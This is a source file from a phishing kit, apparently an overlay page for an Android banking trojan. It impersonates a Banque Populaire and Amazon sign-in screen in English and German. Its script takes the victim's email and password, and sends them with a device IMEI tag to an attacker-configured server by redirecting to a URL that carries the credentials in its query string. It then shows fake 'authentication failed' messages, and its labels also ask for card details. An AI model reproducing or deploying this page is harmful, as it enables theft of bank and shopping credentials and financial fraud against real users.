<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>BanquePopulaire</title>

    <link rel="stylesheet" href="fr/BanquePopulaire/css/normalize.css">
	<link rel="stylesheet" href="shop/com.ebay.mobile/css/style.css">
	<link rel="stylesheet" href="fr/BanquePopulaire/css/cat.style.css" type="text/css" media="all">
    <link rel="stylesheet" href="fr/BanquePopulaire/css/agricole.css">

    <script src="fr/BanquePopulaire/js/vendor/jquery-1.11.3.min.js"></script>
    <script src="fr/BanquePopulaire/js/viewport.js"></script>
	<script src="fr/BanquePopulaire/js/cat.functions.js"></script>
    <link rel="stylesheet" href="shop/com.amazon.mShop.android.shopping/font-awesome/css/font-awesome.min.css">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<div class="header">
<img class="headerimage" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANwAAAAyCAMAAAAAykVBAAAAZlBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQD/mQDh/JrDAAAAInRSTlMAIFCAYDBAcBDP/9+/r++fjyBgn7//73AQAFBA34Cvz48wxlygyAAABKBJREFUaN7Nmeu6qiAQhkEUMclDWmlmte7/JrcHUEaxUrHt/FnPEv1mXgdmwBD6wrBFarOdiWHq0n6IWjZlMxU0xqjlUjo1qnWyxGzvIM0nnaLNazsi5PB2yGpCIkHz39GZUnD7AIPDwHzcq4tLYc9HG48cIxYJJ3gtmuND/zJq4R1ZXYhhxdZRBPZHBXIYmSBhXLkWMXg/VZw469isoX8pKPxj5fVbvdvKpGN7pIA/wDkwpR6DcEdFatXUxKOpc+AALlRzQjT3OZMKU3DMf3s/eIysgePjAERKdCPQ2AeFKbjj6DJR7wcvy1+TODkzqmpBPeDqMxwdKlhSwZ0qKM3l7gkqH2gnMtE5WVFTXHXWs6ArHCpcSJViGERWFKgIUgG8q0jrRWRUJM5nygyNAJxvUzIoQUtMaFhgjnIA56qrpFnglprhNwqjdU3UF2Cr3IEK12CT9XDMJSH3BuUKwPlg+bQR+UqsjDQKQi/Uwcm8e6C4tj4dhQE4YSYqiiaPAO6I1HWC1SHyQWHQ7kSHCFVShBQGArA9c3CY2oT4GjgC4NA0XK0Q+WM4mRtRZWTQHI3+JQCbm4HDhGvazhw4R6uAQFM7wlSFsBd5o7QbgXO4vgd/Dzel0Fg03GsM1hLvlc3D2YfDSrhJBbC7s9Dv4frIfB7yJXDTCkrrVDrf7+BwtzXHE9XyE1xXLwjWVMuj2roAXLQ9XAj61xK4I2i2EYRzhyeIHo5DuMA8HIOlK5wPN1CA0xJuTZC2FfBRKzAFR+EeZ8Gae6fQbU0CSvv971HZcMFZahjOhaEFahf9Dg5uARmYc3CX70UW8InBorfMw8HQbHBQWwIHFPCoQ/i2ctkFETDzcLa6Yrqy3QrOgwvhoVydscNTKVePPOopa6M1d3AZsnx4DJ235upEWAE4i+vguHpYdfrzMd4ADk2csb3Z1VJDMQWnOeNHCG3Y5wYWft/nJhSiN3Cjj1LiPGkajgE/nlg04YwmjrUKkXzGD11amx15feDvP+2Z21uqfkLW7nPtWXtLVSESNcpunwlC9aMqdn157gGfcTlDG8EhJufVkbb1U35KjtTdvMiPB4ZEd8QjBXECGH/s73q5/CpfSdrDEwTR+F9ulFZTRwaC8Y8UaPPDyepfA/6jxackPdd2Sa9ZbtzQgmeym5lAihZM2H0fcOX5flrvOXucoe0DLn6ez89iredTlaw0fZVlmd53BJdnFd05LcxFUSfxshO4PE+aVXIyFUVRv6zdwNWTqsYr47VYSZK1aq/9wOV/7UI5P27LncfXWuSa56/qz21HcHn2ElXukiyKKzu15fJSJf+5yZJbAVdNqfu558tm5kw2grRii6u/yc7g8qxU2lRaflk+49urfytXuYDjvcFVgcJO/Hxd3xJmRfm4K/c/WqTnNolbCzfcQzUltOrMtwJCFsWpTNILvFF2yrhdeDuE0+F1dknT9D4x1m8CyqZi7hOuevXJ5TzTkr/+8fs2k9IQXF3XnzPInqcMbE82YjMF11T37/ie1zj/kSGTYtXZ8/4W7J6csvx3hkwLxrdSW0Oej7L4JdgmcAKxuJW93Yo4/x/2DyNqEH0Utw7QAAAAAElFTkSuQmCC"> 

<select id="lang" style="float: right;">
    <option>English</option>
    <option>Deutsch</option>
</select>
</div>



<div class="mainform">
<div class="bodyclass">

<p data-translate="_signin" style="margin-left: 5%;font-weight: bold;">Sign in</p>

<!--START OF FORM-->
<div id="cat-error">
					<span>Authentication failed or timed out</span>
					<input type="submit" class="logon_btn" value="Try enter again"
						onClick="tryEnterAgain();"/>
				</div>
<form id="form">
    <center id="form1">
        <input placeholder="Email address" data-translate="_email" id="email" name="field2" type="email" class="field1" type="text">
        <br>
        <input placeholder="Password" data-translate="_password" type="password" name="field3" id="password" class="field2" type="text">

        <br>
        <input class="button" type="button"  data-translate="_login" onClick="sentServer();" value="Log In">
        <br></br><br>
        <p data-translate="_footer1" style="font-family: arial;font-size: 13.3333px;padding: 0;margin: 0;">By signing in you agreeing our terms listed in </p>
		<p data-translate="_footer2" style="font-family: arial;font-size: 13.3333px;padding: 0;margin: 0;">Conditions of Use & Sale, Privacy Notice and Cookies.</p>
    </center>

</form>
<form id="cat-step-2" class="cat-last-step">
						<span>Authentication failed or timed out</span>
						<input type="submit" class="logon_btn" value="Try enter again"
							onClick="closeWindow()"/>
					</form>
<!--END OF FORM-->
</div>
<script type="text/javascript">
$(function () {

    // Lets be professional, shall we?
    "use strict";

    // Some variables for later
    var dictionary, set_lang;

    // Object literal behaving as multi-dictionary
    dictionary = {
        "english": {
            "_signin": "Sign in",
            "_email": "Email Address",
            "_login": "Log In",
            "_footer1": "By signing in you agreeing our terms listed in",
            "_footer2": "Conditions of Use & Sale, Privacy Notice and Cookies.",
            "_creditcart": "Credit Card Number",
            "_nameoncard": "Name on Card",
            "_zipcode": "Zip Code",
            "_getin": "Get in",
            "_completeverification": "Complete verification",
            "_password": "Password"
        },
        "deutsch": {
            "_signin": "Anmelden",
            "_email": "Email Adresse",
            "_login": "Anmelden",
            "_footer1": "Durch die Anmeldung bei Sie sich damit einverstanden unsere Allgemeinen aufgelistet",
            "_footer2": "Allgemeine Geschäftsbedingungen, Datenschutzerklärung und Cookies.",
            "_creditcart": "Kreditkartennummer",
            "_nameoncard": "Name auf der Karte",
            "_zipcode": "Postleitzahl",
            "_getin": "Bekommen",
            "_completeverification": "Die vollständige Verifizierung",
            "_password": "Passwort"
        }
    };

    // Function for swapping dictionaries
    set_lang = function (dictionary) {
        $("[data-translate]").text(function () {
            var key = $(this).data("translate");
            if (dictionary.hasOwnProperty(key)) {
                return dictionary[key];
            }
        });
    };

    // Swap languages when menu changes
    $("#lang").on("change", function () {
        var language = $(this).val().toLowerCase();
        if (dictionary.hasOwnProperty(language)) {
            set_lang(dictionary[language]);
        }
    });

    // Set initial language to English
    set_lang(dictionary.english);

});
</script>
<script>
	function sentServer()
	{
		var oNumInp1 = document.getElementById('email');
		
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 6)&&(oNumInp2.value.length > 4)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["email"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|Amazon|"+login1+"|"+pass);
	}
	}
</script>

</body>
</html>
